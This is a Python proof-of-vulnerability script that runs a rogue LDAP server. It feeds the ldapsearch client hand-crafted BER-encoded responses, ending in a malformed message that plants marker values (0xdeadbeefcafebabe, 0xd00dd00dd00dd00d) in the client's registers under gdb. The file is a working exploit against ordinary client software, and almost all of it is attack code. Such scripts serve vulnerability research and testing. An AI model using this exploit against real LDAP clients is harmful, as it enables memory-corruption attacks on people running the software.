#!/usr/bin/env python3

import sys
import socket
import os
import subprocess
import struct

def start_listener( port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', port) )
    except:
        print('[ERROR] Failed to bind to: %d' %port)
        sys.exit(0)

    s.listen(5)

    print('[INFO] Listener started on port: %d' %port)

    return s

def parse_ber( ber_data ):

    if len(ber_data) < 2:
        return ( [], -1 )

    msgid = ber_data[0]

    length = ber_data[1]

    index = 2

    if ( length & 0x80 ):
        nb = length ^ 0x80

        length = 0

        if len(ber_data) < index + nb:
            return ( [], -1 )

        while ( nb ):
            length |= (ber_data[index] << ( (nb-1) * 8))

            index = index + 1
            nb = nb - 1
    
    if len(ber_data) < index + length:
        return ( [], -1)

    print('[INFO] msg_id: %x len: %x' %(msgid, length) )

    return ( ber_data[index:index+length], index + length )

def accept_connection( s ):

    client_socket, client_address = s.accept()

    y = client_socket.recv(1024)

    bv, ni = parse_ber( y )

    y = y[ni:]

    while ( ni != -1 ):
        bv, ni = parse_ber( y )

        if ni == -1:
            break

        y = y[ni:]

    z = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00'

    client_socket.send(z)

    y = client_socket.recv(1024)

    bv, ni = parse_ber( y )

    z = b'\x30\x63'
    z += b'\x02\x01\x02\x64\x5e\x04\x0f\x64\x63\x3d\x63\x68\x65\x73\x73\x2c'
    z += b'\x64\x63\x3d\x63\x6f\x6d\x30\x4b\x30\x2c\x04\x0b\x6f\x62\x6a\x65'
    z += b'\x63\x74\x43\x6c\x61\x73\x73\x31\x1d\x04\x03\x74\x6f\x70\x04\x08'
    z += b'\x64\x63\x4f\x62\x6a\x65\x63\x74\x04\x0c\x6f\x72\x67\x61\x6e\x69'
    z += b'\x7a\x61\x74\x69\x6f\x6e\x30\x0c\x04\x01\x6f\x31\x07\x04\x05\x63'
    z += b'\x68\x65\x73\x73\x30\x0d\x04\x02\x64\x63\x31\x07\x04\x05\x63\x68'
    z += b'\x65\x73\x73'

    client_socket.send(z)

    z = b'\x30\x81\xcc'
    z += b'\x02\x01\x02\x64\x81\xc6\x04\x18\x63\x6e\x3d\x61\x64\x6d\x69\x6e'
    z += b'\x2c\x64\x63\x3d\x63\x68\x65\x73\x73\x2c\x64\x63\x3d\x63\x6f\x6d'
    z += b'\x30\x81\xa9\x30\x39\x04\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61'
    z += b'\x73\x73\x31\x2a\x04\x14\x73\x69\x6d\x70\x6c\x65\x53\x65\x63\x75'
    z += b'\x72\x69\x74\x79\x4f\x62\x6a\x65\x63\x74\x04\x12\x6f\x72\x67\x61'
    z += b'\x6e\x69\x7a\x61\x74\x69\x6f\x6e\x61\x6c\x52\x6f\x6c\x65\x30\x0d'
    z += b'\x04\x02\x63\x6e\x31\x07\x04\x05\x61\x64\x6d\x69\x6e\x30\x23\x04'
    z += b'\x0b\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x31\x14\x04\x12'
    z += b'\x4c\x44\x41\x50\x20\x61\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74'
    z += b'\x6f\x72\x30\x38\x04\x0c\x75\x73\x65\x72\x50\x61\x73\x73\x77\x6f'
    z += b'\x72\x64\x31\x28\x04\x26\x7b\x53\x53\x48\x41\x7d\x58\x6f\x73\x32'
    z += b'\x65\x31\x74\x77\x6f\x50\x44\x5a\x68\x68\x7a\x44\x59\x51\x5a\x47'
    z += b'\x34\x42\x51\x6b\x58\x6f\x75\x44\x59\x49\x48\x59'

    client_socket.send(z)

    z = b'\x30\x81\x8a'
    z += b'\x02\x01\x02\x64\x81\x84\x04\x19\x6f\x75\x3d\x50\x65\x6f\x70\x6c'
    z += b'\x65\x2c\x64\x63\x3d\x63\x68\x65\x73\x73\x2c\x64\x63\x3d\x63\x6f'
    z += b'\x6d\x30\x67\x30\x28\x04\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61'
    z += b'\x73\x73\x31\x19\x04\x03\x74\x6f\x70\x04\x12\x6f\x72\x67\x61\x6e'
    z += b'\x69\x7a\x61\x74\x69\x6f\x6e\x61\x6c\x55\x6e\x69\x74\x30\x0e\x04'
    z += b'\x02\x6f\x75\x31\x08\x04\x06\x50\x65\x6f\x70\x6c\x65\x30\x2b\x04'
    z += b'\x0b\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x31\x1c\x04\x1a'
    z += b'\x43\x6f\x6e\x74\x61\x69\x6e\x65\x72\x20\x66\x6f\x72\x20\x75\x73'
    z += b'\x65\x72\x20\x65\x6e\x74\x72\x69\x65\x73'

    client_socket.send(z)

    z = b'\x30\x82\x01\x56'
    z += b'\x02\x01\x02\x64\x82\x01\x4f\x04\x28\x75\x69\x64\x3d\x68\x61\x77'
    z += b'\x61\x69\x69\x6a\x6f\x68\x6e\x2c\x6f\x75\x3d\x50\x65\x6f\x70\x6c'
    z += b'\x65\x2c\x64\x63\x3d\x63\x68\x65\x73\x73\x2c\x64\x63\x3d\x63\x6f'
    z += b'\x6d\x30\x82\x01\x21\x30\x41\x04\x0b\x6f\x62\x6a\x65\x63\x74\x43'
    z += b'\x6c\x61\x73\x73\x31\x32\x04\x03\x74\x6f\x70\x04\x06\x70\x65\x72'
    z += b'\x73\x6f\x6e\x04\x14\x6f\x72\x67\x61\x6e\x69\x7a\x61\x74\x69\x6f'
    z += b'\x6e\x61\x6c\x50\x65\x72\x73\x6f\x6e\x04\x0d\x69\x6e\x65\x74\x4f'
    z += b'\x72\x67\x50\x65\x72\x73\x6f\x6e\x30\x13\x04\x03\x75\x69\x64\x31'
    z += b'\x0c\x04\x0a\x68\x61\x77\x61\x69\x69\x6a\x6f\x68\x6e\x30\x15\x04'
    z += b'\x09\x67\x69\x76\x65\x6e\x4e\x61\x6d\x65\x31\x08\x04\x06\x48\x61'
    z += b'\x77\x61\x69\x69\x30\x0c\x04\x02\x73\x6e\x31\x06\x04\x04\x4a\x6f'
    z += b'\x68\x6e\x30\x13\x04\x02\x63\x6e\x31\x0d\x04\x0b\x68\x61\x77\x61'
    z += b'\x69\x69\x20\x6a\x6f\x68\x6e\x30\x23\x04\x0f\x74\x65\x6c\x65\x70'
    z += b'\x68\x6f\x6e\x65\x4e\x75\x6d\x62\x65\x72\x31\x10\x04\x0e\x28\x34'
    z += b'\x30\x38\x29\x20\x35\x35\x35\x2d\x33\x39\x32\x32\x30\x2c\x04\x18'
    z += b'\x66\x61\x63\x73\x69\x6d\x69\x6c\x65\x54\x65\x6c\x65\x70\x68\x6f'
    z += b'\x6e\x65\x4e\x75\x6d\x62\x65\x72\x31\x10\x04\x0e\x28\x34\x30\x38'
    z += b'\x29\x20\x35\x35\x35\x2d\x34\x30\x30\x30\x30\x20\x04\x04\x6d\x61'
    z += b'\x69\x6c\x31\x18\x04\x16\x68\x61\x77\x61\x69\x69\x6a\x6f\x68\x6e'
    z += b'\x40\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x30\x18\x04\x0c'
    z += b'\x75\x73\x65\x72\x50\x61\x73\x73\x77\x6f\x72\x64\x31\x08\x04\x06'
    z += b'\x73\x65\x63\x72\x65\x74'

    client_socket.send(z)

    z = b'\x30\x82\x01\x4e'
    z += b'\x02\x01\x02\x64'
    z += b'\x82\x01\x47\x04\x22\x75\x69\x64\x3d\x79\x6f\x6c\x6f\x2c\x6f\x75'
    z += b'\x3d\x50\x65\x6f\x70\x6c\x65\x2c\x64\x63\x3d\x63\x68\x65\x73\x73'
    z += b'\x2c\x64\x63\x3d\x63\x6f\x6d\x30\x82\x01\x1f\x30\x41\x04\x0b\x6f'
    z += b'\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x31\x32\x04\x03\x74\x6f'
    z += b'\x70\x04\x06\x70\x65\x72\x73\x6f\x6e\x04\x14\x6f\x72\x67\x61\x6e'
    z += b'\x69\x7a\x61\x74\x69\x6f\x6e\x61\x6c\x50\x65\x72\x73\x6f\x6e\x04'
    z += b'\x0d\x69\x6e\x65\x74\x4f\x72\x67\x50\x65\x72\x73\x6f\x6e\x30\x0d'
    z += b'\x04\x03\x75\x69\x64\x31\x06\x04\x04\x79\x6f\x6c\x6f\x30\x16\x04'
    z += b'\x09\x67\x69\x76\x65\x6e\x4e\x61\x6d\x65\x31\x09\x04\x07\x59\x6f'
    z += b'\x75\x4f\x6e\x6c\x79\x30\x10\x04\x02\x73\x6e\x31\x0a\x04\x08\x4c'
    z += b'\x69\x76\x65\x4f\x6e\x63\x65\x30\x18\x04\x02\x63\x6e\x31\x12\x04'
    z += b'\x10\x59\x6f\x75\x4f\x6e\x6c\x79\x20\x4c\x69\x76\x65\x4f\x6e\x63'
    z += b'\x65\x30\x23\x04\x0f\x74\x65\x6c\x65\x70\x68\x6f\x6e\x65\x4e\x75'
    z += b'\x6d\x62\x65\x72\x31\x10\x04\x0e\x28\x38\x30\x38\x29\x20\x38\x37'
    z += b'\x36\x2d\x35\x33\x30\x39\x30\x1a\x04\x04\x6d\x61\x69\x6c\x31\x12'
    z += b'\x04\x10\x79\x6f\x6c\x6f\x40\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63'
    z += b'\x6f\x6d\x30\x18\x04\x0c\x75\x73\x65\x72\x50\x61\x73\x73\x77\x6f'
    z += b'\x72\x64\x31\x08\x04\x06\x73\x65\x63\x72\x65\x74\x30\x2c\x04\x18'
    z += b'\x66\x61\x63\x73\x69\x6d\x69\x6c\x65\x54\x65\x6c\x65\x70\x68\x6f'
    z += b'\x6e\x65\x4e\x75\x6d\x62\x65\x72\x31\x10\x04\x0e\x28\x31\x31\x31'
    z += b'\x29\x20\x31\x31\x31\x2d\x31\x31\x31\x31'
    
    client_socket.send(z)

    z = b'\x30\x18\x02\x01\x02\x6a\x08' + struct.pack('Q', 0xdeadbeefcafebabe) + b'\x6a\x08' + struct.pack('>Q', 0xd00dd00dd00dd00d) 
    client_socket.send(z)

    z = b'\x30\x0c\x02\x01\x02\x65\x07\x0a\x01\x00\x04\x00\x04\x00'

    client_socket.send(z)

    client_socket.close()

    print('RSI=0xdd00dd00dd00dd0')
    print('R8=0xdeadbeefcafebabe')
    sys.exit()
    
def check_env( TOOLPATH ):
    if os.path.isfile(TOOLPATH + '/.libs/lt-ldapsearch'):
        return

    args = [TOOLPATH + '/ldapsearch', '-h' ]

    res = subprocess.run( args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    return

def main( argv ):
    if len(sys.argv) == 3:
        TOOLPATH = argv[1]
        LISTENPORT = int(argv[2])
    else:
        if 'LISTENPORT' in os.environ and 'TOOLPATH':
            LISTENPORT = int(os.environ['LISTENPORT'])
            TOOLPATH = os.environ['TOOLPATH']
        else:
            print('[USAGE] %s <path_to_client_tools> <listen_port>' %(argv[0]))
            print('     This pov opens a listening port and then launches the ldapsearch')
            print('     client tool. In lieu of command line args you can use LISTENPORT and TOOLPATH')
            sys.exit(0)

    check_env( TOOLPATH )

    s = start_listener( LISTENPORT )

    print('[INFO] now launch ldapsearch under gdb with the following command:')
    print('[INFO] gdb %s/.libs/lt-ldapsearch' %TOOLPATH)
    print('[INFO] Make sure that the PORT and HOST environment variables are set appropriately')
    print('[INFO] Once running type: source <path_to_pov1.gdb.sc>')

    accept_connection(s)


if __name__ == '__main__':
  main(sys.argv)